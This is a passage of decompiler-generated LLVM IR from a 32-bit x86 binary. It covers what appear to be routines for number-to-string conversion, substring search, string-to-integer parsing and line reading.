; uselistorder directives
  uselistorder i1 %v15_804a752, { 1, 0 }
  uselistorder i32 %v1_804a74b, { 1, 2, 0, 3 }
  uselistorder i1 %v16_804a747, { 1, 0 }
  uselistorder i8 %v4_804a744, { 0, 2, 1 }
  uselistorder i32 %v1_804a739, { 2, 3, 1, 0, 4, 6, 5 }
  uselistorder i32 %v0_804a762, { 2, 0, 1, 3 }
  uselistorder i32 %tmp18, { 0, 2, 1 }
  uselistorder i1* %zf.global-to-local, { 0, 1, 2, 3, 5, 4, 15, 7, 6, 13, 14, 8, 9, 10, 11, 12 }
  uselistorder i32* %edx.global-to-local, { 3, 0, 4, 1, 2 }
  uselistorder i32* %eax.global-to-local, { 0, 1, 2, 3, 4, 5, 7, 6 }
  uselistorder i8* null, { 2, 1, 0 }
  uselistorder i8** @global_var_804f6b0.75, { 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_804a77f, { 4, 1, 2, 0, 3 }
  uselistorder label %dec_label_pc_804a775, { 3, 2, 0, 1 }
  uselistorder label %dec_label_pc_804a744, { 1, 0 }
  uselistorder label %dec_label_pc_804a739, { 1, 0 }
}

define i32 @function_804a784(i64 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_804a784:
  %ebp.global-to-local = alloca i32, align 4
  %ecx.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %tmp = alloca i8*, align 4
  %tmp26 = inttoptr i32 %arg3 to i8*
  %stack_var_-64 = alloca i32, align 4
  %v0_804a787 = load i32, i32* @ebx, align 4
  %v12_804a788 = ptrtoint i32* %stack_var_-64 to i32
  store i8* %tmp26, i8** %tmp, align 4
  %v4_804a78f = trunc i64 %arg1 to i32
  store i32 %arg2, i32* %esi.global-to-local, align 4
  %v2_804a797 = icmp eq i32 %arg3, 0
  br i1 %v2_804a797, label %dec_label_pc_804a809, label %dec_label_pc_804a79b

dec_label_pc_804a79b:                             ; preds = %dec_label_pc_804a784
  %v2_804a79b = icmp eq i32 %v4_804a78f, 0
  %v3_804a79b = icmp slt i32 %v4_804a78f, 0
  br i1 %v2_804a79b, label %dec_label_pc_804a802, label %dec_label_pc_804a79f

dec_label_pc_804a79f:                             ; preds = %dec_label_pc_804a79b
  %v9_804a79f = icmp eq i32 %arg2, 10
  %v1_804a7a2 = icmp eq i1 %v9_804a79f, false
  br i1 %v1_804a7a2, label %dec_label_pc_804a7b1.thread, label %dec_label_pc_804a7a4

dec_label_pc_804a7a4:                             ; preds = %dec_label_pc_804a79f
  %v1_804a7a6 = icmp eq i1 %v3_804a79b, false
  br i1 %v1_804a7a6, label %dec_label_pc_804a7b1.thread, label %dec_label_pc_804a7b1

dec_label_pc_804a7b1:                             ; preds = %dec_label_pc_804a7a4
  store i32 1, i32* %ebp.global-to-local, align 4
  %v1_804a7af = sub i32 0, %v4_804a78f
  store i32 %v1_804a7af, i32* %ecx.global-to-local, align 4
  store i32 32, i32* @ebx, align 4
  br label %dec_label_pc_804a7c3

dec_label_pc_804a7b1.thread:                      ; preds = %dec_label_pc_804a79f, %dec_label_pc_804a7a4
  store i32 %v4_804a78f, i32* %ecx.global-to-local, align 4
  store i32 0, i32* %ebp.global-to-local, align 4
  store i32 32, i32* @ebx, align 4
  br label %dec_label_pc_804a7c3

dec_label_pc_804a7c3:                             ; preds = %dec_label_pc_804a7b1.thread, %dec_label_pc_804a7b1, %dec_label_pc_804a7c3.dec_label_pc_804a7c3_crit_edge
  %v3_804a7d6 = phi i32 [ %v1_804a7e0, %dec_label_pc_804a7c3.dec_label_pc_804a7c3_crit_edge ], [ 32, %dec_label_pc_804a7b1 ], [ 32, %dec_label_pc_804a7b1.thread ]
  %v2_804a7d6 = phi i32 [ %v2_804a7d6.pre, %dec_label_pc_804a7c3.dec_label_pc_804a7c3_crit_edge ], [ %v12_804a788, %dec_label_pc_804a7b1 ], [ %v12_804a788, %dec_label_pc_804a7b1.thread ]
  %v0_804a7c7 = phi i32 [ %v0_804a7de, %dec_label_pc_804a7c3.dec_label_pc_804a7c3_crit_edge ], [ %arg2, %dec_label_pc_804a7b1 ], [ %arg2, %dec_label_pc_804a7b1.thread ]
  %v0_804a7c5 = phi i32 [ %div6, %dec_label_pc_804a7c3.dec_label_pc_804a7c3_crit_edge ], [ %v1_804a7af, %dec_label_pc_804a7b1 ], [ %v4_804a78f, %dec_label_pc_804a7b1.thread ]
  %tmp35 = urem i32 %v0_804a7c5, %v0_804a7c7
  %v1_804a7c9 = add i32 %tmp35, -9
  %v6_804a7c9 = sub i32 8, %tmp35
  %v7_804a7c9 = and i32 %v6_804a7c9, %tmp35
  %v8_804a7c9 = icmp slt i32 %v7_804a7c9, 0
  %v9_804a7c9 = icmp eq i32 %v1_804a7c9, 0
  %v10_804a7c9 = icmp slt i32 %v1_804a7c9, 0
  %v3_804a7cc = icmp eq i1 %v10_804a7c9, %v8_804a7c9
  %v4_804a7cc = icmp eq i1 %v9_804a7c9, false
  %v5_804a7cc = and i1 %v4_804a7cc, %v3_804a7cc
  %storemerge.v = select i1 %v5_804a7cc, i32 55, i32 48
  %storemerge = add i32 %storemerge.v, %tmp35
  %v1_804a7d6 = trunc i32 %storemerge to i8
  %v4_804a7d6 = add i32 %v3_804a7d6, 14
  %v5_804a7d6 = add i32 %v4_804a7d6, %v2_804a7d6
  %v6_804a7d6 = inttoptr i32 %v5_804a7d6 to i8*
  store i8 %v1_804a7d6, i8* %v6_804a7d6, align 1
  %v0_804a7dc = load i32, i32* %ecx.global-to-local, align 4
  %v0_804a7de = load i32, i32* %esi.global-to-local, align 4
  %div6 = udiv i32 %v0_804a7dc, %v0_804a7de
  %v0_804a7e0 = load i32, i32* @ebx, align 4
  %v1_804a7e0 = add i32 %v0_804a7e0, -1
  store i32 %v1_804a7e0, i32* @ebx, align 4
  store i32 %div6, i32* %ecx.global-to-local, align 4
  %v1_804a7e3 = icmp ugt i32 %v0_804a7de, %v0_804a7dc
  %v1_804a7e5 = icmp eq i1 %v1_804a7e3, false
  br i1 %v1_804a7e5, label %dec_label_pc_804a7c3.dec_label_pc_804a7c3_crit_edge, label %dec_label_pc_804a7e7

dec_label_pc_804a7c3.dec_label_pc_804a7c3_crit_edge: ; preds = %dec_label_pc_804a7c3
  %v2_804a7d6.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_804a7c3

dec_label_pc_804a7e7:                             ; preds = %dec_label_pc_804a7c3
  %v0_804a7e7.pre = load i32, i32* %ebp.global-to-local, align 4
  %v1_804a7e7 = icmp eq i32 %v0_804a7e7.pre, 0
  br i1 %v1_804a7e7, label %dec_label_pc_804a7f2, label %dec_label_pc_804a7eb

dec_label_pc_804a7eb:                             ; preds = %dec_label_pc_804a7e7
  %v0_804a7eb.pre = load i32, i32* @esp, align 4
  %phitmp = add i32 %v0_804a7e0, 13
  %v3_804a7eb = add i32 %phitmp, %v0_804a7eb.pre
  %v4_804a7eb = inttoptr i32 %v3_804a7eb to i8*
  store i8 45, i8* %v4_804a7eb, align 1
  %v1_804a7f3.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_804a7f3

dec_label_pc_804a7f2:                             ; preds = %dec_label_pc_804a7e7
  store i32 %v0_804a7e0, i32* @ebx, align 4
  br label %dec_label_pc_804a7f3

dec_label_pc_804a7f3:                             ; preds = %dec_label_pc_804a7eb, %dec_label_pc_804a7f2
  %v1_804a7f3 = phi i32 [ %v1_804a7f3.pre, %dec_label_pc_804a7eb ], [ %v0_804a7e0, %dec_label_pc_804a7f2 ]
  %v0_804a7f3 = load i32, i32* @esp, align 4
  %v2_804a7f3 = add i32 %v1_804a7f3, 14
  %v3_804a7f3 = add i32 %v2_804a7f3, %v0_804a7f3
  %tmp37 = bitcast i8** %tmp to i32*
  %v0_804a7f85 = load i32, i32* %tmp37, align 4
  %v3_804a7f9 = call i32 @function_804a6d6(i32 %v0_804a7f85, i32 %v3_804a7f3)
  store i32 %v0_804a7f85, i32* @ecx, align 4
  %tmp39 = inttoptr i32 %v0_804a7f85 to i8*
  br label %dec_label_pc_804a809

dec_label_pc_804a802:                             ; preds = %dec_label_pc_804a79b
  store i8 48, i8* %tmp26, align 1
  %v2_804a805 = add i32 %arg3, 1
  %v3_804a805 = inttoptr i32 %v2_804a805 to i8*
  store i8 0, i8* %v3_804a805, align 1
  %v0_804a80c.pre = load i8*, i8** %tmp, align 4
  br label %dec_label_pc_804a809

dec_label_pc_804a809:                             ; preds = %dec_label_pc_804a784, %dec_label_pc_804a7f3, %dec_label_pc_804a802
  %v0_804a80c = phi i8* [ %tmp26, %dec_label_pc_804a784 ], [ %tmp39, %dec_label_pc_804a7f3 ], [ %v0_804a80c.pre, %dec_label_pc_804a802 ]
  %v1_804a80c = ptrtoint i8* %v0_804a80c to i32
  store i32 %v0_804a787, i32* @ebx, align 4
  ret i32 %v1_804a80c

; uselistorder directives
  uselistorder i32 %v0_804a7f85, { 1, 0, 2 }
  uselistorder i32 %v1_804a7e0, { 1, 0 }
  uselistorder i32 %v0_804a7e0, { 2, 1, 0, 3 }
  uselistorder i32 %div6, { 1, 0 }
  uselistorder i32 %v0_804a7de, { 1, 2, 0 }
  uselistorder i32 %v1_804a7c9, { 1, 0 }
  uselistorder i32 %tmp35, { 0, 1, 3, 2 }
  uselistorder i32 %v4_804a78f, { 0, 2, 1, 4, 3 }
  uselistorder i32* %ecx.global-to-local, { 0, 2, 3, 1 }
  uselistorder i32* %ebp.global-to-local, { 1, 0, 2 }
  uselistorder i32 (i32, i32)* @function_804a6d6, { 12, 16, 15, 14, 13, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_804a809, { 2, 1, 0 }
  uselistorder label %dec_label_pc_804a7f3, { 1, 0 }
  uselistorder label %dec_label_pc_804a7c3, { 2, 0, 1 }
  uselistorder label %dec_label_pc_804a7b1.thread, { 1, 0 }
}

define i32 @function_804a813(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_804a813:
  %tmp10 = call i32 @__decompiler_undefined_function_0()
  %v8_804a828 = icmp sgt i32 %tmp10, %arg2
  br i1 %v8_804a828, label %dec_label_pc_804a854, label %dec_label_pc_804a82a

dec_label_pc_804a82a:                             ; preds = %dec_label_pc_804a813
  %v2_804a839 = add i32 %arg1, -1
  %v5_804a85220 = icmp sgt i32 %arg2, 0
  br i1 %v5_804a85220, label %dec_label_pc_804a835, label %dec_label_pc_804a854

dec_label_pc_804a835:                             ; preds = %dec_label_pc_804a82a, %dec_label_pc_804a84e
  %v0_804a84f23 = phi i32 [ %v1_804a84f, %dec_label_pc_804a84e ], [ 1, %dec_label_pc_804a82a ]
  %v0_804a84e22 = phi i32 [ %v1_804a84e, %dec_label_pc_804a84e ], [ 0, %dec_label_pc_804a82a ]
  %v0_804a84321 = phi i32 [ %v3_804a83d6, %dec_label_pc_804a84e ], [ 0, %dec_label_pc_804a82a ]
  %v3_804a839 = add i32 %v2_804a839, %v0_804a84f23
  %v4_804a839 = inttoptr i32 %v3_804a839 to i8*
  %v5_804a839 = load i8, i8* %v4_804a839, align 1
  %v4_804a83d = add i32 %v0_804a84321, %arg3
  %v5_804a83d = inttoptr i32 %v4_804a83d to i8*
  %v6_804a83d = load i8, i8* %v5_804a83d, align 1
  %v17_804a83d = icmp eq i8 %v5_804a839, %v6_804a83d
  %v1_804a841 = icmp eq i1 %v17_804a83d, false
  br i1 %v1_804a841, label %dec_label_pc_804a84c, label %dec_label_pc_804a843

dec_label_pc_804a843:                             ; preds = %dec_label_pc_804a835
  %v1_804a843 = add i32 %v0_804a84321, 1
  %v12_804a844 = icmp eq i32 %v1_804a843, %tmp10
  %v1_804a846 = icmp eq i1 %v12_804a844, false
  br i1 %v1_804a846, label %dec_label_pc_804a84e, label %dec_label_pc_804a857

dec_label_pc_804a84c:                             ; preds = %dec_label_pc_804a835
  br label %dec_label_pc_804a84e

dec_label_pc_804a84e:                             ; preds = %dec_label_pc_804a843, %dec_label_pc_804a84c
  %v3_804a83d6 = phi i32 [ %v1_804a843, %dec_label_pc_804a843 ], [ 0, %dec_label_pc_804a84c ]
  %v1_804a84e = add nuw nsw i32 %v0_804a84e22, 1
  %v1_804a84f = add nuw i32 %v0_804a84f23, 1
  %v5_804a852 = icmp slt i32 %v1_804a84e, %arg2
  br i1 %v5_804a852, label %dec_label_pc_804a835, label %dec_label_pc_804a854

dec_label_pc_804a854:                             ; preds = %dec_label_pc_804a82a, %dec_label_pc_804a84e, %dec_label_pc_804a813
  br label %dec_label_pc_804a857

dec_label_pc_804a857:                             ; preds = %dec_label_pc_804a843, %dec_label_pc_804a854
  %storemerge1 = phi i32 [ -1, %dec_label_pc_804a854 ], [ %v0_804a84f23, %dec_label_pc_804a843 ]
  ret i32 %storemerge1

; uselistorder directives
  uselistorder i32 %v1_804a84e, { 1, 0 }
  uselistorder i32 %v1_804a843, { 1, 0 }
  uselistorder i32 %v0_804a84f23, { 0, 2, 1 }
  uselistorder i32 %arg2, { 1, 0, 2 }
  uselistorder label %dec_label_pc_804a857, { 1, 0 }
  uselistorder label %dec_label_pc_804a854, { 1, 0, 2 }
  uselistorder label %dec_label_pc_804a84e, { 1, 0 }
  uselistorder label %dec_label_pc_804a835, { 1, 0 }
}

define i32 @function_804a85d() local_unnamed_addr {
dec_label_pc_804a85d:
  %tmp33 = call i64 @__decompiler_undefined_function_4()
  %tmp35 = call i8* @__decompiler_undefined_function_3()
  %v4_804a864 = ptrtoint i8* %tmp35 to i32
  %v4_804a868.pre = load i32, i32* @edx, align 4
  br label %dec_label_pc_804a868

dec_label_pc_804a868:                             ; preds = %dec_label_pc_804a878, %dec_label_pc_804a873, %dec_label_pc_804a868, %dec_label_pc_804a85d
  %v4_804a868 = phi i32 [ %v4_804a868.pre, %dec_label_pc_804a85d ], [ %v6_804a868, %dec_label_pc_804a868 ], [ %v6_804a868, %dec_label_pc_804a873 ], [ %v6_804a868, %dec_label_pc_804a878 ]
  %v0_804a86a = phi i32 [ %v4_804a864, %dec_label_pc_804a85d ], [ %v1_804a86a, %dec_label_pc_804a868 ], [ %v1_804a86a, %dec_label_pc_804a873 ], [ %v1_804a86a, %dec_label_pc_804a878 ]
  %v1_804a868 = inttoptr i32 %v0_804a86a to i8*
  %v2_804a868 = load i8, i8* %v1_804a868, align 1
  %v3_804a868 = zext i8 %v2_804a868 to i32
  %v5_804a868 = and i32 %v4_804a868, -256
  %v6_804a868 = or i32 %v3_804a868, %v5_804a868
  %v1_804a86a = add i32 %v0_804a86a, 1
  %v7_804a86e = icmp eq i8 %v2_804a868, 32
  br i1 %v7_804a86e, label %dec_label_pc_804a868, label %dec_label_pc_804a873

dec_label_pc_804a873:                             ; preds = %dec_label_pc_804a868
  %v10_804a873 = icmp eq i8 %v2_804a868, 9
  br i1 %v10_804a873, label %dec_label_pc_804a868, label %dec_label_pc_804a878

dec_label_pc_804a878:                             ; preds = %dec_label_pc_804a873
  %v10_804a878 = icmp eq i8 %v2_804a868, 10
  br i1 %v10_804a878, label %dec_label_pc_804a868, label %dec_label_pc_804a93b

dec_label_pc_804a895:                             ; preds = %dec_label_pc_804a93b
  %v10_804a895 = icmp eq i8 %v2_804a868, 43
  %v1_804a898 = icmp eq i1 %v10_804a895, false
  br i1 %v1_804a898, label %dec_label_pc_804a949, label %dec_label_pc_804a89e

dec_label_pc_804a89e:                             ; preds = %dec_label_pc_804a895
  %v1_804a89e = inttoptr i32 %v1_804a86a to i8*
  %v2_804a89e = load i8, i8* %v1_804a89e, align 1
  %v1_804a8a1 = add i32 %v0_804a86a, 2
  br label %dec_label_pc_804a949

dec_label_pc_804a8a7:                             ; preds = %dec_label_pc_804a949, %dec_label_pc_804a944
  %v0_804a91731 = phi i32 [ %v0_804a91732, %dec_label_pc_804a949 ], [ %v1_804a88a, %dec_label_pc_804a944 ]
  %v0_804a8b810.in = phi i8 [ %v0_804a8b811.in, %dec_label_pc_804a949 ], [ %v2_804a882, %dec_label_pc_804a944 ]
  %v5_804a8ab = phi i64 [ 2147483647, %dec_label_pc_804a949 ], [ 2147483648, %dec_label_pc_804a944 ]
  %storemerge5 = phi i32 [ 0, %dec_label_pc_804a949 ], [ 1, %dec_label_pc_804a944 ]
  %v12_804a8ab = udiv i64 %v5_804a8ab, %tmp33
  %v13_804a8ab = trunc i64 %v12_804a8ab to i32
  %v14_804a8ab = urem i64 %v5_804a8ab, %tmp33
  %v15_804a8ab = trunc i64 %v14_804a8ab to i32
  %v5_804a8ec = trunc i64 %tmp33 to i32
  br label %dec_label_pc_804a8b8

dec_label_pc_804a8b8:                             ; preds = %dec_label_pc_804a917, %dec_label_pc_804a8a7
  %v0_804a917 = phi i32 [ %v1_804a91a, %dec_label_pc_804a917 ], [ %v0_804a91731, %dec_label_pc_804a8a7 ]
  %v1_804a90c = phi i32 [ %v1_804a90c28, %dec_label_pc_804a917 ], [ 0, %dec_label_pc_804a8a7 ]
  %v0_804a8f6 = phi i32 [ %v0_804a92621, %dec_label_pc_804a917 ], [ 0, %dec_label_pc_804a8a7 ]
  %v0_804a8f2 = phi i32 [ %v0_804a91d20, %dec_label_pc_804a917 ], [ 0, %dec_label_pc_804a8a7 ]
  %v2_804a8b8 = phi i32 [ %v2_804a8b812, %dec_label_pc_804a917 ], [ %v13_804a8ab, %dec_label_pc_804a8a7 ]
  %v0_804a8e8.in = phi i8 [ %v2_804a917, %dec_label_pc_804a917 ], [ %v0_804a8b810.in, %dec_label_pc_804a8a7 ]
  %v0_804a8e8 = sext i8 %v0_804a8e8.in to i32
  %v2_804a8bc = add i8 %v0_804a8e8.in, -48
  %tmp44 = icmp ult i8 %v2_804a8bc, 10
  br i1 %tmp44, label %dec_label_pc_804a8c2, label %dec_label_pc_804a8c7

dec_label_pc_804a8c2:                             ; preds = %dec_label_pc_804a8b8
  %v12_804a8bc = zext i8 %v2_804a8bc to i32
  %v3_804a8b8 = and i32 %v2_804a8b8, -256
  %v15_804a8bc = or i32 %v12_804a8bc, %v3_804a8b8
  %v1_804a8c2 = add nsw i32 %v0_804a8e8, -48
  br label %dec_label_pc_804a8ec

dec_label_pc_804a8c7:                             ; preds = %dec_label_pc_804a8b8
  %v2_804a8ce = add i8 %v0_804a8e8.in, -65
  %tmp42 = icmp ult i8 %v2_804a8ce, 26
  %v3_804a8d2 = zext i1 %tmp42 to i32
  %v1_804a8d8 = icmp eq i1 %tmp42, false
  %v1_804a8da = icmp eq i1 %v1_804a8d8, false
  br i1 %v1_804a8da, label %dec_label_pc_804a8e8, label %dec_label_pc_804a8dc

dec_label_pc_804a8dc:                             ; preds = %dec_label_pc_804a8c7
  %v2_804a8dc = add i8 %v0_804a8e8.in, -97
  %tmp45 = icmp ult i8 %v2_804a8dc, 26
  br i1 %tmp45, label %dec_label_pc_804a8e4, label %dec_label_pc_804a91d

dec_label_pc_804a8e4:                             ; preds = %dec_label_pc_804a8dc
  br label %dec_label_pc_804a8e8

dec_label_pc_804a8e8:                             ; preds = %dec_label_pc_804a8c7, %dec_label_pc_804a8e4
  %v1_804a8ea = phi i32 [ 55, %dec_label_pc_804a8c7 ], [ 87, %dec_label_pc_804a8e4 ]
  %v2_804a8ea = sub nsw i32 %v0_804a8e8, %v1_804a8ea
  br label %dec_label_pc_804a8ec

dec_label_pc_804a8ec:                             ; preds = %dec_label_pc_804a8c2, %dec_label_pc_804a8e8
  %v2_804a8b813 = phi i32 [ %v15_804a8bc, %dec_label_pc_804a8c2 ], [ %v3_804a8d2, %dec_label_pc_804a8e8 ]
  %v1_804a90f = phi i32 [ %v1_804a8c2, %dec_label_pc_804a8c2 ], [ %v2_804a8ea, %dec_label_pc_804a8e8 ]
  %v5_804a8f0 = icmp slt i32 %v1_804a90f, %v5_804a8ec
  br i1 %v5_804a8f0, label %dec_label_pc_804a8f2, label %dec_label_pc_804a91d

dec_label_pc_804a8f2:                             ; preds = %dec_label_pc_804a8ec
  %v2_804a8f2 = icmp slt i32 %v0_804a8f2, 0
  br i1 %v2_804a8f2, label %dec_label_pc_804a914, label %dec_label_pc_804a8f6

dec_label_pc_804a8f6:                             ; preds = %dec_label_pc_804a8f2
  %tmp46 = icmp ugt i32 %v0_804a8f6, %v13_804a8ab
  br i1 %tmp46, label %dec_label_pc_804a914, label %dec_label_pc_804a8fb

dec_label_pc_804a8fb:                             ; preds = %dec_label_pc_804a8f6
  %v14_804a8f6 = icmp eq i32 %v0_804a8f6, %v13_804a8ab
  %v1_804a8fb = icmp eq i1 %v14_804a8f6, false
  br i1 %v1_804a8fb, label %dec_label_pc_804a903, label %dec_label_pc_804a8fd

dec_label_pc_804a8fd:                             ; preds = %dec_label_pc_804a8fb
  %v5_804a8fd = sub i32 %v1_804a90f, %v15_804a8ab
  %v11_804a8fd = xor i32 %v1_804a90f, %v15_804a8ab
  %v12_804a8fd = xor i32 %v5_804a8fd, %v1_804a90f
  %v13_804a8fd = and i32 %v12_804a8fd, %v11_804a8fd
  %v14_804a8fd = icmp slt i32 %v13_804a8fd, 0
  %v15_804a8fd = icmp eq i32 %v5_804a8fd, 0
  %v16_804a8fd = icmp slt i32 %v5_804a8fd, 0
  %v3_804a901 = icmp eq i1 %v16_804a8fd, %v14_804a8fd
  %v4_804a901 = icmp eq i1 %v15_804a8fd, false
  %v5_804a901 = and i1 %v4_804a901, %v3_804a901
  br i1 %v5_804a901, label %dec_label_pc_804a914, label %dec_label_pc_804a903

dec_label_pc_804a903:                             ; preds = %dec_label_pc_804a8fd, %dec_label_pc_804a8fb
  %v4_804a90c = mul i32 %v1_804a90c, %v5_804a8ec
  %v2_804a90f = add i32 %v1_804a90f, %v4_804a90c
  br label %dec_label_pc_804a917

dec_label_pc_804a914:                             ; preds = %dec_label_pc_804a8f6, %dec_label_pc_804a8fd, %dec_label_pc_804a8f2
  br label %dec_label_pc_804a917

dec_label_pc_804a917:                             ; preds = %dec_label_pc_804a903, %dec_label_pc_804a914
  %v0_804a92621 = phi i32 [ %v2_804a90f, %dec_label_pc_804a903 ], [ %v0_804a8f6, %dec_label_pc_804a914 ]
  %v1_804a90c28 = phi i32 [ %v2_804a90f, %dec_label_pc_804a903 ], [ %v1_804a90c, %dec_label_pc_804a914 ]
  %v2_804a8b812 = phi i32 [ %v4_804a90c, %dec_label_pc_804a903 ], [ %v2_804a8b813, %dec_label_pc_804a914 ]
  %v0_804a91d20 = phi i32 [ 1, %dec_label_pc_804a903 ], [ -1, %dec_label_pc_804a914 ]
  %v1_804a917 = inttoptr i32 %v0_804a917 to i8*
  %v2_804a917 = load i8, i8* %v1_804a917, align 1
  %v1_804a91a = add i32 %v0_804a917, 1
  br label %dec_label_pc_804a8b8

dec_label_pc_804a91d:                             ; preds = %dec_label_pc_804a8dc, %dec_label_pc_804a8ec
  %v2_804a91d = icmp slt i32 %v0_804a8f2, 0
  %v1_804a91f = icmp eq i1 %v2_804a91d, false
  %v4_804a930 = icmp eq i32 %storemerge5, 0
  br i1 %v1_804a91f, label %dec_label_pc_804a930, label %dec_label_pc_804a921

dec_label_pc_804a921:                             ; preds = %dec_label_pc_804a91d
  %v2_804a926 = zext i1 %v4_804a930 to i32
  %v1_804a9283 = or i32 %v2_804a926, -2147483648
  br label %dec_label_pc_804a95b

dec_label_pc_804a930:                             ; preds = %dec_label_pc_804a91d
  br i1 %v4_804a930, label %dec_label_pc_804a95b, label %dec_label_pc_804a937

dec_label_pc_804a937:                             ; preds = %dec_label_pc_804a930
  %v1_804a937 = sub i32 0, %v0_804a8f6
  br label %dec_label_pc_804a95b

dec_label_pc_804a93b:                             ; preds = %dec_label_pc_804a878
  %v10_804a93b = icmp eq i8 %v2_804a868, 45
  %v1_804a93e = icmp eq i1 %v10_804a93b, false
  br i1 %v1_804a93e, label %dec_label_pc_804a895, label %dec_label_pc_804a944

dec_label_pc_804a944:                             ; preds = %dec_label_pc_804a93b
  %v1_804a882 = inttoptr i32 %v1_804a86a to i8*
  %v2_804a882 = load i8, i8* %v1_804a882, align 1
  %v1_804a88a = add i32 %v0_804a86a, 2
  br label %dec_label_pc_804a8a7

dec_label_pc_804a949:                             ; preds = %dec_label_pc_804a895, %dec_label_pc_804a89e
  %v0_804a91732 = phi i32 [ %v1_804a86a, %dec_label_pc_804a895 ], [ %v1_804a8a1, %dec_label_pc_804a89e ]
  %v0_804a8b811.in = phi i8 [ %v2_804a868, %dec_label_pc_804a895 ], [ %v2_804a89e, %dec_label_pc_804a89e ]
  br label %dec_label_pc_804a8a7

dec_label_pc_804a95b:                             ; preds = %dec_label_pc_804a930, %dec_label_pc_804a937, %dec_label_pc_804a921
  %v0_804a95e = phi i32 [ %v0_804a8f6, %dec_label_pc_804a930 ], [ %v1_804a937, %dec_label_pc_804a937 ], [ %v1_804a9283, %dec_label_pc_804a921 ]
  ret i32 %v0_804a95e

; uselistorder directives
  uselistorder i1 %v4_804a930, { 1, 0 }
  uselistorder i32 %v4_804a90c, { 1, 0 }
  uselistorder i32 %v5_804a8fd, { 1, 2, 0 }
  uselistorder i8 %v2_804a8bc, { 1, 0 }
  uselistorder i32 %v0_804a8e8, { 1, 0 }
  uselistorder i32 %v0_804a8f6, { 0, 1, 4, 3, 2 }
  uselistorder i32 %v1_804a90c, { 1, 0 }
  uselistorder i32 %v0_804a917, { 1, 0 }
  uselistorder i32 %v13_804a8ab, { 1, 0, 2 }
  uselistorder i32 %v1_804a86a, { 3, 5, 4, 2, 1, 0 }
  uselistorder i32 %v6_804a868, { 2, 1, 0 }
  uselistorder i8 %v2_804a868, { 0, 2, 1, 3, 4, 5, 6 }
  uselistorder i32 %v0_804a86a, { 1, 0, 2, 3 }
  uselistorder i8 9, { 0, 2, 1 }
  uselistorder i8 32, { 0, 4, 2, 1, 3 }
  uselistorder label %dec_label_pc_804a95b, { 1, 0, 2 }
  uselistorder label %dec_label_pc_804a949, { 1, 0 }
  uselistorder label %dec_label_pc_804a91d, { 1, 0 }
  uselistorder label %dec_label_pc_804a917, { 1, 0 }
  uselistorder label %dec_label_pc_804a914, { 1, 0, 2 }
  uselistorder label %dec_label_pc_804a8ec, { 1, 0 }
  uselistorder label %dec_label_pc_804a8e8, { 1, 0 }
}

define i32 @function_804a965(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_804a965:
  %ebp.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %v0_804a966 = load i32, i32* @edi, align 4
  store i32 0, i32* %esi.global-to-local, align 4
  %v0_804a96a = load i32, i32* @ebx, align 4
  store i32 %arg1, i32* @ebx, align 4
  store i32 %arg2, i32* %ebp.global-to-local, align 4
  store i32 %arg3, i32* @edi, align 4
  %v0_804a97a.pre = load i32, i32* @eax, align 4
  br label %dec_label_pc_804a97a

dec_label_pc_804a97a:                             ; preds = %dec_label_pc_804a992.dec_label_pc_804a97a_crit_edge, %dec_label_pc_804a965
  %v0_804a981 = phi i32 [ %v0_804a981.pre, %dec_label_pc_804a992.dec_label_pc_804a97a_crit_edge ], [ %arg3, %dec_label_pc_804a965 ]
  %v1_804a97d = phi i32 [ %v1_804a98d, %dec_label_pc_804a992.dec_label_pc_804a97a_crit_edge ], [ 0, %dec_label_pc_804a965 ]
  %v0_804a97d = phi i32 [ %v1_804a992, %dec_label_pc_804a992.dec_label_pc_804a97a_crit_edge ], [ %arg1, %dec_label_pc_804a965 ]
  %v0_804a97a = phi i32 [ %v1_804a98a, %dec_label_pc_804a992.dec_label_pc_804a97a_crit_edge ], [ %v0_804a97a.pre, %dec_label_pc_804a965 ]
  %v2_804a97d = add i32 %v0_804a97d, %v1_804a97d
  %v4_804a982 = inttoptr i32 %v2_804a97d to i32*
  %v5_804a982 = call i32 @function_804afe8(i32 %v0_804a981, i32* %v4_804a982, i32 1, i32 %v0_804a97a)
  %v1_804a98a = add i32 %v5_804a982, -1
  %v8_804a98a = icmp eq i32 %v1_804a98a, 0
  %v1_804a98b = icmp eq i1 %v8_804a98a, false
  %v0_804a99b.pre = load i32, i32* %esi.global-to-local, align 4
  br i1 %v1_804a98b, label %dec_label_pc_804a999, label %dec_label_pc_804a98d

dec_label_pc_804a98d:                             ; preds = %dec_label_pc_804a97a
  %v1_804a98d = add i32 %v0_804a99b.pre, 1
  store i32 %v1_804a98d, i32* %esi.global-to-local, align 4
  %v1_804a98e = load i32, i32* %ebp.global-to-local, align 4
  %v5_804a990 = icmp slt i32 %v1_804a98d, %v1_804a98e
  br i1 %v5_804a990, label %dec_label_pc_804a992, label %dec_label_pc_804a999

dec_label_pc_804a992:                             ; preds = %dec_label_pc_804a98d
  %v1_804a992 = load i32, i32* @ebx, align 4
  %v3_804a992 = add i32 %v1_804a992, %v0_804a99b.pre
  %v4_804a992 = inttoptr i32 %v3_804a992 to i8*
  %v5_804a992 = load i8, i8* %v4_804a992, align 1
  %v14_804a992 = icmp eq i8 %v5_804a992, 10
  %v1_804a997 = icmp eq i1 %v14_804a992, false
  br i1 %v1_804a997, label %dec_label_pc_804a992.dec_label_pc_804a97a_crit_edge, label %dec_label_pc_804a999

dec_label_pc_804a992.dec_label_pc_804a97a_crit_edge: ; preds = %dec_label_pc_804a992
  %v0_804a981.pre = load i32, i32* @edi, align 4
  br label %dec_label_pc_804a97a

dec_label_pc_804a999:                             ; preds = %dec_label_pc_804a97a, %dec_label_pc_804a98d, %dec_label_pc_804a992
  %v0_804a99b = phi i32 [ %v1_804a98d, %dec_label_pc_804a98d ], [ %v1_804a98d, %dec_label_pc_804a992 ], [ %v0_804a99b.pre, %dec_label_pc_804a97a ]
  %v1_804a99b = icmp eq i32 %v0_804a99b, 0
  %v1_804a99d = icmp eq i1 %v1_804a99b, false
  %v0_804a9a5 = load i32, i32* @ebx, align 4
